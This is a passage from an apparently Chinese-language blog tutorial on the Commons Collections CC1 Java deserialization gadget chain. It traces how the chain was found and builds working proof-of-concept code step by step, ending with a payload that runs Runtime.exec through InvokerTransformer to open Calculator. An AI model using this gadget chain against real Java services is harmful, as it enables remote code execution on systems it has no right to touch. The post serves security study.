class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChian</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他小型触发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Map map = <span class="keyword">new</span> HashedMap();</span><br><span class="line">Map transformedMap = TransformedMap.decorate(map,chainedTransformer,<span class="keyword">null</span>);</span><br><span class="line">map1.put(<span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line"><span class="comment">//给予map数据转化链</span></span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发漏洞</span></span><br><span class="line">Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line"><span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">onlyElement.setValue(<span class="string">"foobar"</span>);</span><br></pre></td></tr></table></figure><h4 id="利用链寻找"><a href="#利用链寻找" class="headerlink" title="利用链寻找"></a>利用链寻找</h4><p>这里我想从漏洞挖掘的角度去写，毕竟这是个老洞，我们更应该关注的是如何找到的。</p><p>还是那句话，上来找readObject复写点，非常多！只不过我们现在关注TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512104425592.png" alt="image-20210512104425592" style="zoom:90%;"><p>翻看commons-collections的文档可以发现：</p><blockquote><p>该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换(transform)方法，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p></blockquote><blockquote><p>举个例子获得一个TransformedMap的实例，可以通过TransformedMap.decorate()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure><p>可以看到三个参数，map，keyTransformer，valueTransformer</p></blockquote><p>翻译过来：<strong>当TransformedMap内的key或者value发生变化时，就会触发相应参数的Transformer的transform()方法。</strong></p><p>其实这句话值得引起我们的怀疑，<strong>transform参数是否可控</strong>？</p><p>索性去找Transformer类，发现是一个接口，只有一个transform方法，find implementation(option+cmd+B)，一共14个：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105022662.png" alt="image-20210512105022662"></p><p>先看第一个，ChainedTransformer：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512113116168.png" alt="image-20210512113116168"></p><p>这里的iTransformer属性是一个Transformer[]数组，并且发现在ChainTransformer的transform函数中，会依次对该数组里面的transformer依次进行transform方法(不同的Transformer实现类实现的transform不同，多态)。</p><p>而且这里有一个细节就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br></pre></td></tr></table></figure><p>这条语句放在了一个循环里面。</p><p>这也就<strong>导致上一次tranform方法的结果返回值会作为下一次transform的参数</strong>，越来越有链的感觉了！</p><p><strong>世界线展开</strong></p><p>这时候我们可以寻找invoke函数的调用点。</p><p>其实这里我认为我们始终离不开找invoke这样的sink点环节，碰巧发现在InvokeTransformer有invoke方法的使用：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105446730.png" alt="image-20210512105446730" style="zoom:90%;"><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105544347.png" alt="image-20210512105544347"></p><p>哦这熟悉的反射味道，血压拉满！</p><p>如果这里input是可控的，按逻辑走，会获得input的Class对象，下一步想获取method对象，但是发现有两个参数iMethodName和iParamTypes。</p><p>往前翻构造函数：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512110405704.png" alt="image-20210512110405704"></p><p><strong>InvokerTransformer类就是今天的主角，因为他有RCE触发点。</strong></p><p>InvokerTransformer这部分我们先按下不表，接下来就要寻找哪些方法可以调用InvokerTransformer类呢？逃不开之前找到的14个Transformer，因为他们实现了Transformer这个接口，都现实了transform方法。</p><p>我们接下来要找transform方法在哪被调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512114920825.png" alt="image-20210512114920825"></p><p>看TransformedMap内部：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512115236996.png" alt="image-20210512115236996"></p><p>只有这三处调用了transform方法。</p><p>前两个都是本类方法，但是第三个checkSetValue方法是一个抽象方法，属于AbstractInputCheckedMapDecorator的抽象方法，它一共有两个类实现，TransformedMap算一个：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512115852020.png" alt="image-20210512115852020"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512120730684.png" alt="image-20210512120730684"></p><p>查找checkSetValue方法在哪可以被调用，发现在内部类MapEntry的setValue方法中调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512134704165.png" alt="image-20210512134704165"></p><p>也就是说，<strong>只要一个类A继承了抽象类AbstractInputCheckedMapDecorator，那么A就会有内部类A.MapEntry，就可以A.MapEntry.setValue()执行方法。</strong></p><p><strong>我们的TransformedMap就是这样的一个A</strong></p><p>寻找实现AbstractInputCheckedMapDecorator的类，一共有4个：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512195129400.png" alt="image-20210512195129400"></p><p>正好TransformedMap算一个。所以它既是readObejct复写点又是执行链的起点</p><p><strong>世界线收束</strong></p><h4 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h4><p>经典一句话，弹计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br></pre></td></tr></table></figure><p>反射写法：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "open /Applications/Calculator.app");</span><br></pre></td></tr></table></figure><p>不清楚的可以看之前的<a href="https://0range228.github.io/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/">博客</a></p><p>那现在要如何构造这句话呢？</p><p>首先上一部分我们发现了InvokerTransformer有invoke触发点，用反射来出发。</p><p>重要的是每个参数如何对应赋值，看InvokerTransformer的第二个构造方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512142534887.png" alt="image-20210512142534887"></p><p>我们“一句话”到执行函数是exec，回去看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512142625801.png" alt="image-20210512142625801"></p><p>exec的参数类型是String，所以InvokerTransformer构造函数的三个参数分别是：</p><ul><li>methodName = “exec” =&gt; iMethodName</li><li>paramTypes = “new Class[]{String.class}” =&gt; iParamtypes</li><li>iArgs = “new String[]{“open /Applications/Calculator.app”}” =&gt; iArgs</li></ul><p>所以尝试写一个demo1.0：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer it = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                new String[]&#123;"open /Applications/Calculator.app"&#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//得到Runtime.getRuntime()实例input</span></span><br><span class="line">        Object input = Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为了能触发exec.invoke(input,"cmd"),需要执行transform方法</span></span><br><span class="line">        it.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题来了，不会有人可以写好一个input在代码中等你，所以input需要写进payload。</p><p>所以接下来我们要去找：<strong>哪些类可以把input塞进去</strong>？</p><p>由于这里input依赖了反射，所以我们最好在jar包里找到一个invoke的复写点，直接全局搜invoke，发现只有InvokerTransformer自己。</p><p>所以这里<strong>我们需要将input拆开，为了依赖不同的组件</strong>。</p><p>想法就是既然你ChainedTransformer的transform可以<strong>循环调用</strong>Transformer数组内的不同tranform方法，那么我们也去找若干个Transformer来将input分别承担。</p><p>首先我们感觉肯定是越简单越好，最好是直接出现一个Transformer可以直接返回一个Runtime.getRuntime()</p><p>这样第二步直接new InvokerTransformer()就可以了：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().invoke(method(exec),<span class="string">"open /Applications/Calculator.app"</span>)</span><br></pre></td></tr></table></figure><p>寻找Transformer的实现类14个：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512150641804.png" alt="image-20210512150641804" style="zoom:80%;"><p>我们只想要一个Transformer帮我们承担Runtime.getRuntime()即可，其他最好什么都不做。</p><p>发现ConstantTransformer最合适：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512150729223.png" alt="image-20210512150729223" style="zoom:80%;"><p>完全都是简单的传递。</p><p>所以这时候demo2.0出现了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例</span></span><br><span class="line">                <span class="comment">// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);<span class="comment">//触发ChainedTransformer里面每一个人的transform</span></span><br></pre></td></tr></table></figure><p>但是这版本仅仅在本地可以测试，因为Runtime类没有实现Serializable接口，所以无法传输。</p><p>所以我们就需要反序列化那一端机器的Runtime实例。</p><p>继续拆分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">  <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>)，//先得到<span class="title">Class</span>对象，<span class="title">Class</span>支持<span class="title">Serializable</span></span></span><br><span class="line">                new ConstantTransformer("getRuntime",new Class[]&#123;&#125;,new Object[]&#123;&#125;),//得到getRuntime方法对象</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)//将这个方法对象套在exec上</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>讲道理这样是可以的，但是实际上还是不行：</p><p>因为在InvokerTransformer的tranform中：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512153300247.png" alt="image-20210512153300247"></p><p>上来先input.getClass了，别忘了我们给的东西是Runtime.class，那结果肯定是Class对象java.lang.Class。</p><p>在java.lang.Class中寻找getRuntime对象肯定是找不到的。</p><p>所以这时候需要换一个思路：<strong>先拿到梯子，这里面的梯子就是getMethod方法</strong></p><p>目标语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标语句</span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>步走</span><br><span class="line"><span class="number">1</span>.先获得getMethod的方法对象，这个方法在java.lang.Class中</span><br><span class="line">Method gm = Class.forName("java.lang.Class").getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;)</span><br><span class="line"><span class="number">2</span>.拿到之后，需要把getRuntime函数取出来。因为getMethod方法的作用就是返回一个method对象，所以直接invoke就行</span><br><span class="line">Method gr = gm.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[]&#123;&#125;);</span><br><span class="line"><span class="number">3</span>.准备用gm去把invoke引出来</span><br><span class="line">Method i = gm.invoke(Class.forName(<span class="string">"java.lang.reflect.Method"</span>),<span class="string">"invoke"</span>)</span><br><span class="line"><span class="number">4</span>.组合到一起</span><br><span class="line">i.invoke("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br></pre></td></tr></table></figure><p>晕的可以往下看：</p><p>失败版构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//先获取<span class="title">Runtime</span>实例</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">       <span class="comment">//还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想拿到getRuntime方法，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个Method方法</span></span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">          <span class="comment">//最后一轮是先获取exec方法，invoke方法的命令是“open /Applications/Calculator.app”</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>InvokerTransformer的参数包括(方法名a，a的参数类型，invoke的参数{对象，对象参数})</p><p>我们认为可以，但实际上还是不行，原因：</p><p>在第二步出来之后，object是getRuntime，是method对象，<strong>一个Method对象是不能调用exec()的</strong></p><p>所以我们这里还需要<strong>invoke</strong>函数的参与</p><p>所以我们还需要再来一步得到invoke函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//先获取<span class="title">Runtime</span>实例</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">       <span class="comment">//还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想先反射出来getRuntime参数，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个方法。</span></span><br><span class="line">  new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;null,new Object[]&#123;&#125;&#125;)</span><br><span class="line">          <span class="comment">//把invoke方法引出来，看好参数的类别，该占位占位</span></span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">          <span class="comment">//最后一轮是先获取exec方法，invoke方法的命令是“open /Applications/Calculator.app”</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里重点记录一下invoke环节的debug过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=getRuntime这个Method对象</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Method（getRuntime方法是Method类）</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//在method类中找到invoke方法，method=invoke方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//调用invoke方法，input=getRuntime这个方法，传入自定义的参数</span></span><br></pre></td></tr></table></figure><p>最后一步其实就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke.invoke(getRuntime(),<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;);</span><br></pre></td></tr></table></figure><p>发现一个骚东西：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">invoke.invoke(a,&#123;b,c&#125;)</span><br><span class="line">  a.invoke(b,c)</span><br><span class="line">  b.a(c)</span><br></pre></td></tr></table></figure><p>套用在最后一句上：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invoke.invoke(getRuntime(),<span class="keyword">null</span>);</span><br><span class="line">getRuntime().invoke(<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>这里为什么null可以呢？</p><p>是因为getRuntime函数是static的，根本不需要obj来hold。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513015209016.png" alt="image-20210513015209016" style="zoom:50%;"><p>所以这里这两种写法<strong>都可以</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;null,new Object[]&#123;&#125;&#125;)</span><br><span class="line">new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;Class.forName("java.lang.Runtime"),new Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>多说一句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getRuntime().invoke(<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>这句话相当于：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getRuntime() 后面都是寂寞</span><br><span class="line">getRuntime() =&gt; Runtime 实例</span><br></pre></td></tr></table></figure><p>既然能返回Runtime实例，目标达成。</p><p>第四步debug：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=Runtime类实例</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Runtime </span></span><br><span class="line">Method method = cls.getMethod(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//在Runtime类中找到exec方法，method=exec方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="string">"open /Applications/Calculator.app"</span>); <span class="comment">//调用invoke方法</span></span><br></pre></td></tr></table></figure><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512161134367.png" alt="image-20210512161134367" style="zoom:80%;"><p>所以目前demo3.0:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChainedTransformer</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//触发</span></span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span 